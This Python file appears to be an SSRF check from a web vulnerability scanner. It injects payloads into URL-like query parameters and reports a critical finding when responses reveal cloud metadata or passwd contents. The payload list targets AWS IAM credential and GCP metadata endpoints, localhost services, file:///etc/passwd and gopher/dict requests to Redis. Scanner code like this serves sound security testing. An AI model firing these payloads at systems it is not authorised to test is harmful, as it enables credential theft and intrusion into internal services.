from __future__ import annotations

from icescan.checks.base import BaseCheck
from icescan.core.types import Finding, ScanContext, Surface, SurfaceKind, Severity
from icescan.core.surfaces import inject_into_url

METADATA_PAYLOADS = [
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://127.0.0.1:80/",
    "http://127.0.0.1:22/",
    "http://[::1]/",
    "http://localhost/",
    "file:///etc/passwd",
    "gopher://127.0.0.1:6379/_INFO",
    "dict://127.0.0.1:6379/info",
]

SSRF_HINTS = ("url", "uri", "redirect", "fetch", "load", "proxy", "target", "src", "dest", "callback", "image", "webhook", "feed", "host")
METADATA_SIGS = ["aws", "instance-id", "iam/security-credentials", "ami-id", "computeMetadata", "projects/", "root:x:0:0"]


class SSRF(BaseCheck):
    name = "ssrf"
    category = "server"
    level = 2

    async def run_surface(self, ctx: ScanContext, surface: Surface) -> list[Finding]:
        if surface.kind != SurfaceKind.QUERY:
            return []
        if not any(h in surface.name.lower() for h in SSRF_HINTS):
            return []

        for payload in METADATA_PAYLOADS:
            url = inject_into_url(surface.url, surface.name, payload)
            r = await ctx.client.get(url)
            if r.error or r.status >= 500:
                continue
            body = (r.body or "").lower()
            for sig in METADATA_SIGS:
                if sig in body:
                    return [self.finding(
                        severity=Severity.CRITICAL,
                        url=url, method="GET", param=surface.name,
                        payload=payload,
                        evidence={"signature": sig, "snippet": (r.body or "")[:200]},
                        confidence="high",
                    )]
        return []
